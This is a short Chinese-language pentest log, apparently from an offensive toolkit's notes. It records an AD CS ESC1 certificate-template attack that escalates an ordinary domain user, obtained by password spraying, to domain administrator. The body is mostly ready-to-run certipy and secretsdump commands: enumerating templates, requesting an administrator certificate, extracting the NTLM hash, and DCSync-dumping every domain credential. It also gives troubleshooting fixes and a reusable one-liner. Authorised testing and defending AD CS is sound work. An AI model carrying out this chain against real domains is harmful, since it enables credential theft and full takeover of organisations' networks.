# [2026-03] AD CS ESC1 证书模板滥用 → 域管权限

## 场景分类
渗透测试 / AD 攻击

## 目标概述
通过 AD CS 证书服务的 ESC1 漏洞模板，以普通域用户身份获取域管证书，最终 DCSync 导出全部凭据。

## 完整执行链路

1. 获取一个普通域用户凭据（通过密码喷洒）
2. 使用 certipy 枚举 AD CS 配置
   ```bash
   certipy find -u user@domain.local -p 'Password123' -dc-ip 10.0.0.1
   ```
3. 发现 ESC1 漏洞模板（允许任意 SAN、低权限用户可申请）
4. 以域管身份请求证书
   ```bash
   certipy req -u user@domain.local -p 'Password123' \
     -ca CORP-CA -template VulnTemplate \
     -upn administrator@domain.local -dc-ip 10.0.0.1
   ```
5. 使用证书认证获取 NTLM Hash
   ```bash
   certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
   ```
6. DCSync 导出所有凭据
   ```bash
   secretsdump.py domain.local/administrator@10.0.0.1 -hashes :NTLM_HASH
   ```

## 踩坑记录

| 问题 | 原因 | 解决方案 | 耗时 |
|------|------|---------|------|
| certipy find 超时 | LDAP 连接被防火墙拦截 | 改用 -ns 参数指定 DNS | 20min |
| 证书请求被拒绝 | 模板要求 Manager Approval | 换另一个不需要审批的模板 | 10min |
| auth 失败 KDC_ERR_PADATA | DC 时间不同步 | ntpdate 同步时间后重试 | 5min |

## 工具链发现
- certipy 是 AD CS 攻击的首选工具，比 Certify.exe 更方便（纯 Python，Kali 直接跑）
- 需要确保 DNS 解析正确，否则 Kerberos 认证会失败

## 关键代码/命令
见上方执行链路。

## 可复用的模式/脚本片段
```bash
# AD CS 快速检测一条龙
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -stdout | grep -A5 "ESC"
```

## 对本包的改进建议
- certipy 已加入 Kali bootstrap manifest ✓
- routing.md 已有 "Certipy/AD CS" 路由 ✓

## 进化动作
- [x] 无需更新（已覆盖）

## 环境信息
- Kali 2026.1, certipy 4.8.2
- 目标: Windows Server 2022, AD CS 已部署
- 域功能级别: 2016
